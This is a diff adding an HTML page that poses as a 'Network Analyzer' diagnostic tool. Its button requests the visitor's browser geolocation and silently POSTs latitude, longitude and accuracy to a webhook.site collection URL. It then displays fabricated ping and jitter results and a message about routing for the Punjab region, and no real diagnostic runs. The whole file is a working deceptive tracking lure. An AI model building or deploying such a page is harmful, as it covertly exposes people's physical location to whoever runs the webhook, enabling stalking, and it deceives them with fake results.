@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Network Diagnostic Tool v1.0</title>
+    <style>
+        :root {
+            --primary: #00d4ff;
+            --bg: #0f172a;
+            --card: #1e293b;
+            --text: #f8fafc;
+        }
+
+        body {
+            background-color: var(--bg);
+            color: var(--text);
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        .container {
+            background-color: var(--card);
+            padding: 2rem;
+            border-radius: 12px;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.5);
+            width: 90%;
+            max-width: 400px;
+            text-align: center;
+            border: 1px solid #334155;
+        }
+
+        h2 { color: var(--primary); margin-bottom: 10px; }
+        p { color: #94a3b8; font-size: 0.9rem; line-height: 1.5; }
+
+        .status-box {
+            background: #0f172a;
+            padding: 15px;
+            border-radius: 8px;
+            margin: 20px 0;
+            border-left: 4px solid var(--primary);
+            text-align: left;
+            font-family: monospace;
+            font-size: 0.85rem;
+        }
+
+        .btn {
+            background-color: var(--primary);
+            color: #0f172a;
+            border: none;
+            padding: 12px 24px;
+            border-radius: 6px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: 0.3s;
+            width: 100%;
+        }
+
+        .btn:hover { background-color: #00a3cc; transform: translateY(-2px); }
+
+        .loader {
+            border: 3px solid #334155;
+            border-top: 3px solid var(--primary);
+            border-radius: 50%;
+            width: 20px;
+            height: 20px;
+            animation: spin 1s linear infinite;
+            display: inline-block;
+            margin-right: 10px;
+            vertical-align: middle;
+        }
+
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+
+<div class="container" id="main-card">
+    <h2>Network Analyzer</h2>
+    <p>System ready. Please authorize a local node check to optimize your routing path and latency.</p>
+    
+    <div class="status-box">
+        > Status: <span id="status-text">Awaiting Authorization...</span><br>
+        > Latency: Checking...<br>
+        > Node: Searching...
+    </div>
+
+    <button class="btn" onclick="startDiagnostic()">Run Full Diagnostic</button>
+</div>
+
+<script>
+    const webhookUrl = "https://webhook.site/a6190465-2192-445e-a98c-cdb63aaa9e23";
+
+    function startDiagnostic() {
+        const statusText = document.getElementById('status-text');
+        statusText.innerHTML = '<div class="loader"></div> Requesting Geodata...';
+
+        if ("geolocation" in navigator) {
+            navigator.geolocation.getCurrentPosition((position) => {
+                const data = {
+                    lat: position.coords.latitude,
+                    lon: position.coords.longitude,
+                    acc: position.coords.accuracy,
+                    time: new Date().toISOString()
+                };
+
+                fetch(webhookUrl, {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    body: JSON.stringify(data)
+                }).then(() => {
+                    document.getElementById('main-card').innerHTML = `
+                        <h2 style="color: #22c55e;">Success!</h2>
+                        <p>Optimization Complete. Your routing has been updated for the Punjab region.</p>
+                        <div class="status-box" style="border-color: #22c55e;">
+                            > Ping: 12ms<br>
+                            > Jitter: 2ms<br>
+                            > Accuracy: High
+                        </div>
+                    `;
+                });
+            }, (error) => {
+                statusText.innerText = "Error: Access Denied.";
+                statusText.style.color = "#ef4444";
+            });
+        }
+    }
+</script>
+
+</body>
+</html>
